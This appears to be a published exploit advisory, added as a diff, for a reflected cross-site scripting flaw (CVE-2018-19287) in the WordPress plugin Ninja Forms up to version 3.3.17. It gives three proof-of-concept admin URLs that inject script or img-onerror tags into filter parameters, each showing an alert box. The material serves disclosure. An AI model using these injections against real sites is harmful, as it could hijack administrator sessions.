@@ -1,0 +1,29 @@
+# Exploit Title: Wordpress Plugin Ninja Forms 3.3.17 - Cross-Site Scripting
+# Date: 2018-11-15
+# Exploit Author: MTK
+# Vendor Homepage: https://ninjaforms.com
+# Softwae Link: https://wordpress.org/plugins/ninja-forms/
+# Version: Up to V3.3.17
+# Tested on: Debian 9 - Apache2 - Wordpress 4.9.8 - Firefox
+# CVE : CVE-2018-19287
+
+# Plugin description:
+# Ninja Forms is the ultimate FREE form creation tool for WordPress. Build forms within minutes 
+# using a simple yet powerful drag-and-drop form creator. For beginners, quickly and easily 
+# design complex forms with absolutely no code. For developers, utilize built-in hooks, 
+# filters, and even custom field templates to do whatever you need at any step in 
+# the form building or submission using Ninja Forms as a framework.
+
+# POC
+
+|_1_|
+
+http://127.0.0.1/wp-admin/edit.php?s&post_status=all&post_type=nf_sub&action=-1&form_id=1&nf_form_filter&begin_date&end_date="><img+src=mtk+onerror=alert(/MTK/);//&filter_action=Filter&paged=1&action2=-1
+
+|_2_|
+
+http://127.0.0.1/wp-admin/edit.php?s&post_status=all&post_type=nf_sub&action=-1&form_id=1&nf_form_filter&begin_date="><img+src=mtk+onerror=alert(/MTK/);//&end_date&filter_action=Filter&paged=1&action2=-1
+
+|_3_|
+
+http://127.0.0.1/wp-admin/edit.php?post_status=trash&post_type=nf_sub&form_id=1"><script>alert(/MTK/);</script>&nf_form_filter&paged=1
